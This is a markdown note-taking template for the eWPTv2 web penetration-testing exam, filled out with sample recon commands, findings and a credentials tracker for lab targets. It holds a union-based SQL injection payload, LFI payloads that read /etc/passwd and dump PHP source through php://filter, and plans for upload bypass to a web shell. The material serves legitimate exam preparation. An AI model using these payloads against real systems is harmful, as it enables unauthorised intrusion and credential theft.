# eWPTv2 EXAM SESSION: `YYYY‑MM‑DD`

**Start Time:** `HH:MM`  
**Stop Time:** `HH:MM`  
**Passing Score:** `35 / 50 (70%)`  

***

## 🎯 TARGET INFRASTRUCTURE MAPPING

*Map IPs to app names and technologies as soon as the exam starts to keep questions tied to the right host.*  

| Target IP | Site/App Name        | Tech Stack (Web, Lang, DB, OS) | Status / Notes               |
| :-------- | :------------------- | :----------------------------- | :--------------------------- |
| 10.x.x.10 | Corporate Portal     | Apache, PHP 8, MySQL, Linux    | [ ] Main login / accounts    |
| 10.x.x.11 | Dev / API Server     | Nginx, Python, SQLite, Linux   | [ ] API, possible admin area |

***

## 🛠 TARGET: `10.x.x.10`

### 0. TARGET OVERVIEW & QUESTIONS

- Role / description: `e.g., Public login & account portal`  
- Related questions: `Q1, Q3, Q8, Q12`  

### 0.1 SCANS & TOOLS

- nmap:  
  - Command:  
    `nmap -sV -Pn 10.x.x.10`  
  - Key results:  
    - `80/tcp  open  http   Apache 2.4.57`  
    - `443/tcp open  https  Apache 2.4.57`  
    - `22/tcp  open  ssh    OpenSSH 8.9p1`  

- Web enumeration:  
  - `ffuf -u http://10.x.x.10/FUZZ -w /usr/share/wordlists/...`  
    - Interesting: `/admin/`, `/backup/`, `/uploads/`  
  - `dirsearch -u http://10.x.x.10/ -w ...`  
    - Interesting: `/dev/`, `/old/`  

- Other tools:  
  - `nikto -h http://10.x.x.10` → `X‑Powered‑By`, outdated components, interesting headers.  

***

### 1. DISCOVERY & ENUMERATION

*Capture facts that look like “exam question material”: versions, paths, headers, error messages, etc.*  

- **Server banner:**  
  - Example: `Server: Apache/2.4.57 (Ubuntu)`  
- **X‑Powered‑By / framework clues:**  
  - Example: `X‑Powered‑By: PHP/8.1.0`  
- **Hidden directories / files:**  
  - From `ffuf` / `dirsearch`:  
    - `/backup/` → Contains `config.php.bak`  
    - `/dev/` → Contains API documentation `/dev/api-docs/`  
    - `/uploads/` → User-uploaded files, potential upload vuln  
  - Common files checked:  
    - `/robots.txt` → Disallowed paths: `/private/`, `/beta/`  
    - `.git/` → Repository exposure?  
    - `.env` → Environment vars (DB creds, keys)  

- **Interesting parameters / behaviours:**  
  - `GET /search.php?q=` → Reflects user input (XSS candidate)  
  - `GET /product.php?id=` → Numeric ID, SQLi candidate  
  - `POST /login.php` → Parameter names: `username`, `password`  

***

### 2. VULNERABILITIES & FLAGS

*Each finding in a standard mini‑report format, linked to exam questions where relevant.*  

#### Finding 1: SQL Injection on `search.php?id`

- Related questions: `Q4, Q6`  
- URL / Parameter:  
  - `http://10.x.x.10/search.php?id=[INJECT]`  
- Method:  
  - `Union-based` / `Error-based`  
- Payload used:  
  - `' UNION SELECT 1,2,database(),version()-- -`  
- Evidence (data extracted):  
  - DB name: `user_db`  
  - DB version: `MariaDB 10.6`  
  - Table(s): `users`, `admins`  
  - Admin password hash: ``$2y$10$abcdef...``  
  - Flag: `FLAG{SQLI_SUCCESS_99}`  
- Impact:  
  - Full DB enumeration and credential disclosure; potential account takeover.  

***

#### Finding 2: Local File Inclusion (LFI)

- Related questions: `Q9`  
- URL / Parameter:  
  - `http://10.x.x.10/index.php?page=../../../../etc/passwd`  
- Payloads used:  
  - `?page=../../../../etc/passwd`  
  - `?page=php://filter/convert.base64-encode/resource=index.php`  
- Evidence:  
  - `/etc/passwd` loaded; users like `root`, `www-data`, `john_dev`.  
  - `/var/www/html/config.php` revealed app secret and DB creds.  
- Flag / secret:  
  - `FLAG{LFI_FILE_DISCLOSURE}`  
  - `app_secret_key=...`  
- Impact:  
  - Arbitrary file read, potential credential/secret exposure and RCE depending on files found.  

***

#### Finding 3: [Finding title]

- Related questions: `Qxx`  
- URL / Parameter:  
- Method / vulnerability type:  
- Payload / technique:  
- Evidence (for questions):  
  - [Version / path / value / flag]  
- Impact:  

***

### 3. TODO / IDEAS FOR THIS TARGET

- [ ] Test file upload in `/uploads/` for extension bypass and RCE.  
- [ ] Check password reset / account recovery for token predictability.  
- [ ] Look for IDOR in profile or order endpoints.  

***

### 4. NOTES / LESSONS (OPTIONAL)

- `e.g., Forgot to check HTTP methods; remember OPTIONS/PROPFIND next time.`  
- `e.g., SQLi payload X worked better on this stack.`  

***

## 🔑 MASTER CREDENTIALS TRACKER (ALL TARGETS)

*Update this live for any creds, hashes, or tokens.*  

| Username | Password / Hash          | Source (SQLi, LFI, brute, etc.) | Works on (URL / service)        | Notes                    |
| :------- | :----------------------- | :------------------------------ | :------------------------------ | :----------------------- |
| admin    | `P@ssw0rd!123`          | Hydra on `/admin/login`         | `http://10.x.x.10/admin/login`  | Full admin access        |
| developer| `$2y$10$abcdef...`      | SQLi dump (`admins` table)      | Needs cracking                  | Possibly high privilege  |
| apiuser  | `apitoken-1234...`      | LFI → config.php                | API auth header `X-API-Key`     | Token‑based auth         |

***

## 📝 EXAM QUESTION SCRATCHPAD

*Track questions to revisit and what they likely depend on.*  

- **Q14:** Needs exact CMS version. Likely from HTTP headers, `/admin` footer, or `/CHANGELOG`.  
- **Q29:** Flag in `/uploads`. Need upload bypass and successful web shell / file access.  
- **Q33:** Asks for parameter name used in password reset. Review `/reset.php` traffic.  

***

## 💡 QUICK TIPS FOR YOURSELF

1. Read all 50 questions quickly at start; roughly group them by target (note in each target’s “Overview & questions”).  
2. Screenshot key request/response pairs (especially flags, version banners, successful exploits) from Burp Repeater.  
3. Always verify versions via HTTP responses or application UI, not only service scans.  
4. Keep this file locally and offline; ensure tools and wordlists are ready before starting.  

***

You can duplicate the whole `🛠 TARGET:` block for each IP and just change the IP, role, and related questions.